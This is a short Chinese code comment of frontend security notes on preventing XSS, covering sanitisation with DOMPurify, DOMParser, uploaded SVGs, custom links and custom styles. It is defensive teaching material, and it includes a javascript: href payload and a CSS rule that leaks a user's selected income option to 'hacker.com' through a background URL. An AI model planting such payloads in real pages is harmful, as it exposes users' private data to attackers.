/* 
  永远不要信任用户提交的内容
    不要将用户提交的内容直接转换成DOM
  
  前端框架 React、Vue。默认防御 XSS攻击
  还有google-closure-library提供api防御

  服务端（node）：
    DOMPurify完成字符串的转义，避免xss攻击
    
  XSS--用户需求：必须动态生成dom
    1、string -> dom  :  new DOMParser();
    (需要对string进行转译)

    2、允许用户上传svg（svg标签内可以内嵌sript）
      需要对svg内进行扫描

    3、尽量不要让用户做自定义的跳转行为
      <a href="javascript:alert('xss')"></a>
      要做的话，记得做好过滤
    
    4、自定义样式
      收入调查，选中选项的时候，发生get请求，暴露数据
      input[type=radio].income-gt10k:checked {
        backgroud: url("https://hacker.com/?income=gt10k")
      }
*/